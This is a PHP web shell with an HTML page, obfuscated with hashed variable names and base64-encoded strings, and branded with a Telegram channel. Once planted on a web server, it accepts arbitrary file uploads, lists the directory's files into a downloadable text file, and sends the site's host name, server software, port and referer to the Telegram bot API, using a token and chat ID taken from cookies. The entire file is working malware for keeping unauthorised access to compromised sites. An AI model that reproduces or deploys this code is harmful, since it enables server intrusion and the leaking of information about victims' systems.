<?php $j_3d89e427a1d9 = $_COOKIE[base64_decode('Ym90X3Rva2Vu')];
$m_a88d1c22aa4b = $_COOKIE[base64_decode('Y2hhdF9JRA==')];
function t_9cbe78a5075d($b_d90ccffa0127, $a_403f15dd74fa, $g_b79bfa8f6c55)
{
    $z_572d4e421e5e = "https://api.telegram.org/bot$a_403f15dd74fa/sendMessage?chat_id=$g_b79bfa8f6c55&text=$b_d90ccffa0127";
    $f_10573b873d2f = file_get_contents($z_572d4e421e5e);
    if ($f_10573b873d2f) {
        if (isset($_COOKIE[base64_decode('c2V0aW5mbw==')])) {
            echo base64_decode('PHNjcmlwdD4NCiAgICAgICAgICAgIHN3YWwoJ1NFTlQgVE8gVEVMRUdSQU0nICwgJ1RoZSBpbmZvcm1hdGlvbiBvZiB0aGUgZGVzaXJlZCBzaXRlIHdhcyBzZW50IHRvIFRlbGVncmFtJyAsICdzdWNjZXNzJyApDQogICAgICAgICAgICA8L3NjcmlwdD4=');
        }
    } else {
        header(base64_decode('TG9jYXRpb246c2V0aW5mby5waHA='));
        die(base64_decode('RVJST1I='));
    }
}
;
function c_25744a3435fc()
{
    $k_736007832d21 = __DIR__ . DIRECTORY_SEPARATOR;
    $v_ed55fd11a691 = scandir($k_736007832d21);
    $x_7037faecf765 = fopen(base64_decode('ZGV0YS50eHQ='), base64_decode('dw=='));
    foreach ($v_ed55fd11a691 as $h_4e055892edb2) {
        if (in_array($h_4e055892edb2, array(base64_decode('Lg=='), base64_decode('Li4=')))) {
            continue;
        }
        ;
        $p_27afd8c3dda4 = "<li type='1'><span>File name :</span><a href='$h_4e055892edb2' > $h_4e055892edb2 </li></span><br>";
        $o_9321eb7d79fb = "File Name : $h_4e055892edb2 \r\n";
        fwrite($x_7037faecf765, $o_9321eb7d79fb);
        echo $p_27afd8c3dda4;
    }
    ;
    fclose($x_7037faecf765);
    $q_803c4a234142 = $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')];
    $s_d58899fe1124 = $_SERVER[base64_decode('SFRUUF9IT1NU')];
    $v_0955073566bd = $_SERVER[base64_decode('U0VSVkVSX1BPUlQ=')];
    $z_b20904891cce = $_SERVER[base64_decode('SFRUUF9SRUZFUkVS')];
    $r_8635091da9b0 = strip_tags("📢Web Shell successfully ✅ | 👁️started !Site Name : $s_d58899fe1124 | ⭕ SERVER SOFTWARE : $q_803c4a234142 | 💥 SERVER PORT : $v_0955073566bd | 📂 File location : $z_b20904891cce");
    global $j_3d89e427a1d9, $m_a88d1c22aa4b;
    t_9cbe78a5075d($r_8635091da9b0, $j_3d89e427a1d9, $m_a88d1c22aa4b);
}
function s_5fe73da1aec4()
{
    $k_736007832d21 = __DIR__ . DIRECTORY_SEPARATOR;
    $r_db19e1ef8c95 = $_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')];
    $q_043b400ca3c6 = $k_736007832d21 . base64_decode('Lw==') . $r_db19e1ef8c95;
    $p_4b6817592629 = move_uploaded_file($_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')], $q_043b400ca3c6);
}
s_5fe73da1aec4(); ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Sheel !!</title>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>

<body>

    <img src="https://boxbrain.pk/VOL.jpg" alt="">
    <div id="File_maneg">
        <div class="file_up">
            <p>File uploader :</p>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" id="submit" name="submit" value="File upload Done">
            </form>
            <button class="Dow"><a class="Dows" href="deta.txt" download="deta.txt">Downlod File deta</a></button>
        </div>
        <p class="info1">FILES:</p>
        <ul> <?php c_25744a3435fc() ?></ul>

    </div>

    </div>
    <marquee behavior="left" direction=""><a class="ppp" href="https://t.me/VOLHALTY" target="_blank"> Channel
            VOLHALTY</a></marquee>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Chokokutai&display=swap');

        body {
            background-color: black;
            color: aliceblue;
            overflow: hidden;
        }

        #File_maneg {
            width: 250px;
            height: 500px;
            border: 2px solid #eee;
            border-radius: 14px;
            padding: 1rem;
            overflow: scroll;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
        }

        a {
            text-decoration: none;
            color: green;

        }

        span {
            color: aliceblue;
        }

        .info1 {
            text-shadow: 0 0 20px aliceblue;
        }

        input::-webkit-file-upload-button {
            color: aliceblue;
            background-color: black;
            border: 2px solid aliceblue;
            width: 250px;
            border-radius: 14px;
            margin-bottom: 10px;
            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;

        }

        #submit {
            color: aliceblue;
            background-color: black;
            border: 2px solid aliceblue;
            border-radius: 14px;
            display: block;
            margin-left: 130px;
            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
            transition: 0.5s;

        }

        #submit:hover {
            box-shadow: 0 0 20px aliceblue;
            transition: 0.5s;
        }

        .Dow {
            display: block;
            background-color: black;
            border: 2px solid aliceblue;
            border-radius: 14px;
            color: aliceblue;
            margin-top: -21px;
            margin-left: 5px;
            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;

        }

        .Dows {
            color: aliceblue;
        }

        img {
            width: 300px;
            margin: auto;

        }

        img {
            text-align: center;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            opacity: 30%;
        }

        marquee {
            position: absolute;
            top: 92%;
            left: 50%;
            transform: translate(-50%, -50%);

            width: 50%;
        }

        .ppp {
            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
            color: aliceblue;
            opacity: 50%;
        }
    </style>


    <audio src="https://boxbrain.pk/123.mp3" type="audio/mpeg"></audio>

</body>

</html>